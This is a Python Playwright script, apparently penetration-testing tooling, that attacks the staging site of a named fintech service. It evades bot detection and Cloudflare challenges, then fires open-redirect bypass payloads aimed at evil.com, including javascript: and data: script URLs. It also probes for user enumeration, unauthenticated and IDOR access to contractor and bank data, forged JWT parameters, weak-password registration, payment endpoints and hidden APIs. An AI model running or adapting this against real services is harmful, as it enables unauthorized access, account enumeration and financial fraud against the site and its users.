#!/usr/bin/env python3
"""Deep security testing - focus on confirmed vulnerability areas."""

import asyncio
import json
from playwright.async_api import async_playwright

BASE_URL = "https://my.staging.found.com"

async def eval_fetch(page, method, url, body=None, follow_redirect=True):
    opts = {"method": method, "url": url, "body": body, "follow": follow_redirect}
    return await page.evaluate("""
        async (opts) => {
            try {
                const fetchOpts = {method: opts.method, credentials: 'include'};
                if (!opts.follow) fetchOpts.redirect = 'manual';
                if (opts.body) {
                    fetchOpts.body = typeof opts.body === 'string' ? opts.body : JSON.stringify(opts.body);
                    const csrfCookie = document.cookie.split(';').map(c => c.trim()).find(c => c.startsWith('csrf_token='));
                    const csrfValue = csrfCookie ? csrfCookie.split('=')[1] : '';
                    fetchOpts.headers = {'Content-Type': 'application/json', 'X-CSRF-Token': csrfValue};
                }
                const r = await fetch(opts.url, fetchOpts);
                const text = await r.text();
                const hdrs = {};
                r.headers.forEach((v, k) => hdrs[k] = v);
                return {status: r.status, body: text.substring(0, 3000), headers: hdrs, type: r.type, redirected: r.redirected, finalUrl: r.url};
            } catch(e) { return {error: e.message}; }
        }
    """, opts)


async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-blink-features=AutomationControlled']
        )
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            viewport={"width": 1440, "height": 900},
            locale="en-US"
        )

        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")

        page = await context.new_page()

        print("[*] Loading page...")
        await page.goto(f"{BASE_URL}/signup", wait_until="domcontentloaded", timeout=30000)
        for i in range(20):
            await page.wait_for_timeout(3000)
            title = await page.title()
            if "Just a moment" not in title:
                break

        # =========================================
        # FINDING 1: Open Redirect via /api/stripe/redirect
        # =========================================
        print("\n" + "="*60)
        print("FINDING 1: Open Redirect via /api/stripe/redirect")
        print("="*60)

        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "https://evil.found.com.attacker.com",
            "https://found.com@evil.com",
            "https://found.com.evil.com",
            "/\\evil.com",
            "https://my.staging.found.com.evil.com",
            "https://evil.com/fake?found.com",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "https://evil.com%23.found.com",
            "https://evil.com%2F.found.com",
            "https://evil.com/?@found.com",
            "//evil.com/%2f..",
            "///evil.com",
            "\\\\evil.com",
        ]

        for payload in redirect_payloads:
            resp = await eval_fetch(page, "GET", f"/api/stripe/redirect?return_to={payload}", follow_redirect=False)
            rtype = resp.get('type', '')
            status = resp.get('status', '')
            if rtype == 'opaqueredirect' or status == 302 or status == 301:
                print(f"  [!] REDIRECT: return_to={payload} => type={rtype}, status={status}")
            else:
                print(f"  [OK] return_to={payload} => type={rtype}, status={status}")

        # Follow the redirect to see where it goes
        print("\n  Testing actual redirect destination:")
        resp = await eval_fetch(page, "GET", "/api/stripe/redirect?return_to=https://evil.com", follow_redirect=True)
        print(f"  Follow redirect to evil.com: finalUrl={resp.get('finalUrl', 'unknown')}, status={resp.get('status')}")
        
        resp = await eval_fetch(page, "GET", "/api/stripe/redirect?return_to=https://found.com", follow_redirect=True)
        print(f"  Follow redirect to found.com: finalUrl={resp.get('finalUrl', 'unknown')}, status={resp.get('status')}")

        # =========================================
        # FINDING 2: User Enumeration via Auth Endpoints
        # =========================================
        print("\n" + "="*60)
        print("FINDING 2: User Enumeration via Auth Endpoints")
        print("="*60)

        # Test email-security-code with different emails
        test_emails = [
            "nonexistent-user-1234@example.com",
            "admin@found.com",
            "test@found.com",
            "support@found.com",
        ]

        for email in test_emails:
            resp = await eval_fetch(page, "POST", "/api/email-security-code", body=json.dumps({"email": email}))
            print(f"  /api/email-security-code email={email}: {resp.get('status')} | {str(resp.get('body', ''))[:200]}")

        for email in test_emails:
            resp = await eval_fetch(page, "POST", "/api/sms-security-code", body=json.dumps({"email": email}))
            print(f"  /api/sms-security-code email={email}: {resp.get('status')} | {str(resp.get('body', ''))[:200]}")

        # =========================================
        # FINDING 3: Authentication Bypass - Business Endpoints Returning 500
        # =========================================
        print("\n" + "="*60)
        print("FINDING 3: Auth Bypass - Endpoints Processing Without Auth Check")
        print("="*60)

        # These returned 500 instead of 401, meaning they process the request before auth check
        bypass_tests = [
            {"method": "POST", "url": "/api/business/email-direct-deposit-form", "body": json.dumps({"email": "test@test.com"})},
            {"method": "POST", "url": "/api/business/email-signed-bank-letter", "body": json.dumps({"email": "test@test.com"})},
            {"method": "POST", "url": "/api/business/email-direct-deposit-form", "body": json.dumps({})},
            {"method": "POST", "url": "/api/business/email-signed-bank-letter", "body": json.dumps({})},
        ]

        for test in bypass_tests:
            resp = await eval_fetch(page, test["method"], test["url"], body=test["body"])
            status = resp.get('status')
            body = str(resp.get('body', ''))[:300]
            print(f"  {test['method']} {test['url']}: {status} | {body}")

        # =========================================
        # FINDING 4: Session ID Information Disclosure
        # =========================================
        print("\n" + "="*60)
        print("FINDING 4: Session ID Leak in Error Responses")
        print("="*60)

        session_leak_tests = [
            "/api/verify-code",
            "/api/change-email/v2",
            "/api/change-password",
            "/api/plaid/link-token",
            "/api/debit-card/v3/all",
            "/api/upload",
            "/api/v2/update-name-ssn",
            "/api/v2/update-dob",
            "/api/v2/change-verified-phone",
            "/api/book-entry/v2/set-reason",
            "/api/invoice/check-identifier?identifier=test&estimate=false",
            "/api/linked-account/v2/link-via-account-routing",
        ]

        for ep in session_leak_tests:
            method = "POST" if "check-identifier" not in ep and "link-token" not in ep and "debit-card" not in ep else "GET"
            resp = await eval_fetch(page, method, ep, body=json.dumps({}) if method == "POST" else None)
            body = resp.get('body', '')
            if 'session_id' in body:
                print(f"  [!] {method} {ep}: LEAKS session_id | {body[:200]}")
            else:
                print(f"  [OK] {method} {ep}: {resp.get('status')} | {body[:100]}")

        # =========================================
        # FINDING 5: Business Contact IDOR Testing
        # =========================================
        print("\n" + "="*60)
        print("FINDING 5: IDOR Testing - Business Contact Endpoints")
        print("="*60)

        idor_tests = [
            "/api/business-contact/1",
            "/api/v2/business-contact/1",
            "/api/v2/business-contact/1/bank-account",
            "/api/v2/business-contact/1/contractor-jwt",
            "/api/business-contact/1/mark-as-contractor",
            "/api/business-contact/1/share-1099",
            "/api/contractor/1/w9",
            "/api/custom-category/1",
            "/api/vendor-rule/v2/1",
        ]

        for ep in idor_tests:
            resp = await eval_fetch(page, "GET", ep)
            status = resp.get('status')
            body = str(resp.get('body', ''))[:200]
            if status not in [401, 403, 404]:
                print(f"  [!] POSSIBLE IDOR: GET {ep}: {status} | {body}")
            else:
                print(f"  {ep}: {status} | {body[:100]}")

        # =========================================
        # FINDING 6: Contractor/Invoice JWT Handling
        # =========================================
        print("\n" + "="*60)
        print("FINDING 6: JWT Token Handling")
        print("="*60)

        jwt_tests = [
            "/api/invoice-recipient/create-business-contact-for-sender?invoice_jwt=test",
            "/api/payment-request-recipient/create-business-contact-for-sender?payment_request_jwt=test",
            "/api/bulk1099-export/test/download?jwt=test",
            "/api/public-invoice/test/download-attachment?attachment_jwt=test",
            "/api/invoice-recipient/link?invoice_jwt=test",
            "/api/invoice-recipient/v2/mark-as-paid?invoice_jwt=test",
        ]

        for ep in jwt_tests:
            resp = await eval_fetch(page, "GET", ep)
            status = resp.get('status')
            body = str(resp.get('body', ''))[:300]
            print(f"  GET {ep}: {status} | {body}")

        # Try PUT for some of these
        for ep in ["/api/invoice-recipient/link?invoice_jwt=test", "/api/contractor-login/dismiss"]:
            resp = await eval_fetch(page, "PUT", ep, body=json.dumps({}))
            status = resp.get('status')
            body = str(resp.get('body', ''))[:300]
            print(f"  PUT {ep}: {status} | {body}")

        # =========================================
        # FINDING 7: Password Complexity / Account Security
        # =========================================
        print("\n" + "="*60)
        print("FINDING 7: Weak Password Testing")
        print("="*60)

        weak_passwords = [
            "123",
            "password",
            "1",
            "abc",
            "test",
            "aaaa",
            "12345678",
        ]

        for pwd in weak_passwords:
            resp = await eval_fetch(page, "POST", "/api/register",
                body=json.dumps({"email": f"weakpwd-test-{pwd}@test.com", "password": pwd}))
            status = resp.get('status')
            body = str(resp.get('body', ''))[:200]
            if status != 403:  # Cloudflare
                print(f"  password='{pwd}': {status} | {body}")
            else:
                print(f"  password='{pwd}': blocked by CF")

        # =========================================
        # FINDING 8: Promotion Code Abuse
        # =========================================
        print("\n" + "="*60)
        print("FINDING 8: Promotion Code Testing")
        print("="*60)

        resp = await eval_fetch(page, "POST", "/api/promotion-code/track-invite", body=json.dumps({"code": "test"}))
        print(f"  POST /api/promotion-code/track-invite: {resp.get('status')} | {str(resp.get('body', ''))[:200]}")

        # =========================================
        # FINDING 9: Onboarding Phone Verification
        # =========================================
        print("\n" + "="*60)
        print("FINDING 9: Phone Verification Endpoint")
        print("="*60)

        resp = await eval_fetch(page, "POST", "/api/onboarding/send-phone-verification-code",
            body=json.dumps({"phone_number": "+15551234567"}))
        print(f"  POST /api/onboarding/send-phone-verification-code: {resp.get('status')} | {str(resp.get('body', ''))[:200]}")

        # =========================================
        # FINDING 10: Peer-to-Peer Payment Manipulation
        # =========================================
        print("\n" + "="*60)
        print("FINDING 10: P2P Payment Endpoints")
        print("="*60)

        p2p_tests = [
            {"method": "POST", "url": "/api/peer-to-peer-payment-recipient/link", "body": json.dumps({"token": "test"})},
            {"method": "POST", "url": "/api/peer-to-peer-payment-recipient/v2/accept", "body": json.dumps({"token": "test"})},
            {"method": "POST", "url": "/api/peer-to-peer-payment-recipient/v2/dismiss", "body": json.dumps({"token": "test"})},
        ]

        for test in p2p_tests:
            resp = await eval_fetch(page, test["method"], test["url"], body=test["body"])
            print(f"  {test['method']} {test['url']}: {resp.get('status')} | {str(resp.get('body', ''))[:200]}")

        # =========================================
        # Additional: Mass endpoint discovery
        # =========================================
        print("\n" + "="*60)
        print("Additional: Mass Endpoint Discovery")
        print("="*60)

        discovery_endpoints = [
            "/api/accountant",
            "/api/business",
            "/api/business-contact-login",
            "/api/contractor-login",
            "/api/debit-card-share",
            "/api/debit-card-share/v2",
            "/api/contact",
            "/api/contact/device-contacts",
            "/api/contact/bulk-sync",
            "/api/business-contact/search",
            "/api/business-contact/bulk-search",
            "/api/custom-category",
            "/api/custom-category/v2",
            "/api/vendor-rule",
            "/api/vendor-rule/activate",
            "/api/peer-to-peer-payment",
            "/api/subscription",
            "/api/team-access",
            "/api/transaction-challenge",
            "/api/check-password",
            "/api/enroll-biometrics",
            "/api/verify-biometrics-secret",
        ]

        for ep in discovery_endpoints:
            resp = await eval_fetch(page, "GET", ep)
            status = resp.get('status')
            body = str(resp.get('body', ''))[:150]
            if status not in [404, 403]:
                print(f"  [!] {ep}: {status} | {body}")
            else:
                print(f"  {ep}: {status}")

        await browser.close()
        print("\n[*] Done!")

asyncio.run(main())
